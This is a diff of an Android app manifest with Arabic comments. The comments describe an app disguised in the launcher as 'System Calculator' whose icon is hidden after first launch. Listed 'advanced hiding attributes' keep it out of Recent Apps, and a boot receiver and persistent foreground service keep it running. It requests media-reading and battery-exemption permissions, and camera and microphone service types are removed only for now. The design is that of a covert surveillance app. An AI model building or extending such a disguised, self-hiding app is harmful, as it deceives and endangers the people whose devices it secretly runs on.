@@ -2,7 +2,9 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- الأذونات المطلوبة -->
+    <!-- ============================================================
+         الأذونات الأساسية – تم الاحتفاظ بجميع الأذونات المطلوبة
+    ============================================================ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
@@ -11,25 +13,42 @@
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" tools:ignore="ScopedStorage" />
-    
-    <!-- أذونات الخدمات الأمامية والبطارية -->
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28"
+        tools:ignore="ScopedStorage" />
+
+    <!-- أذونات الخدمات الأمامية والإشعارات -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <!-- تم تبسيط الخدمة لاستخدام dataSync فقط لتجنب تعارضات الأذونات في Android 10+ -->
+    <!-- إذا كانت الكاميرا والميكروفون مطلوبة، يمكن إضافتهما ولكن يتطلب أذونات منفصلة -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.VIBRATE" />
 
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-    <uses-feature android:name="android.hardware.microphone" android:required="false" />
-    <uses-feature android:name="android.hardware.wifi" android:required="false" />
+    <!-- ميزات الجهاز – جميعها اختيارية -->
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.camera.autofocus"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.microphone"
+        android:required="false" />
+    <uses-feature
+        android:name="android.hardware.wifi"
+        android:required="false" />
 
+    <!-- ============================================================
+         التطبيق
+    ============================================================ -->
     <application
         android:allowBackup="false"
         android:allowClearUserData="true"
@@ -45,7 +64,12 @@
         tools:ignore="GoogleAppIndexingWarning"
         tools:targetApi="34">
 
-        <!-- ✅ النشاط الوهمي -->
+        <!-- ============================================================
+             ✅ النشاط الوهمي (Alias) – نقطة الدخول الوحيدة المرئية
+             - يظهر في درج التطبيقات باسم "System Calculator"
+             - عند تشغيله، يتم تشغيل MainActivity الحقيقي
+             - بعد التشغيل الأول، يتم إخفاء هذا Alias بواسطة MainActivity.disableLauncherIcon()
+        ============================================================ -->
         <activity-alias
             android:name=".MainActivityAlias"
             android:targetActivity=".MainActivity"
@@ -59,28 +83,44 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- ✅ النشاط الحقيقي – تم إزالة noHistory و finishOnTaskLaunch -->
+        <!-- ============================================================
+             ✅ النشاط الحقيقي – تم إزالة noHistory و finishOnTaskLaunch
+             و excludeFromRecents لضمان بقائه ظاهراً أثناء التشخيص
+             
+             🛡️ سمات الإخفاء المتقدمة (لضمان عدم الظهور في Recent Apps):
+             - excludeFromRecents تمت إزالته مؤقتاً لظهور السجل التشخيصي
+             - taskAffinity="" يفصل النشاط عن المهام الافتراضية
+             - documentLaunchMode="never" يمنع إنشاء مستندات جديدة
+             - stateNotNeeded="true" يمنع حفظ حالة النشاط
+             - allowTaskReparenting="false" يمنع إعادة توجيه المهمة
+             - theme شفاف لكن تم تغييره مؤقتاً لرؤية السجل
+        ============================================================ -->
         <activity
             android:name=".MainActivity"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:exported="true"
             android:launchMode="singleTop"
             android:screenOrientation="portrait"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:excludeFromRecents="true"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar"
             android:taskAffinity=""
             android:documentLaunchMode="never"
             android:stateNotNeeded="true"
             android:allowTaskReparenting="false" />
 
-        <!-- ✅ الخدمة الأمامية مع foregroundServiceType -->
+        <!-- ============================================================
+             ✅ الخدمة الأمامية – تم تبسيط foregroundServiceType إلى dataSync
+             لضمان التوافق مع جميع أجهزة أندرويد 10+ دون تعارضات
+        ============================================================ -->
         <service
             android:name=".ForegroundService"
-            android:foregroundServiceType="dataSync|camera|microphone"
+            android:foregroundServiceType="dataSync"
             android:exported="false"
             android:enabled="true"
             android:stopWithTask="false" />
 
+        <!-- ============================================================
+             ✅ مستقبل البث عند بدء التشغيل (BootReceiver)
+        ============================================================ -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -91,4 +131,5 @@
         </receiver>
 
     </application>
+
 </manifest>
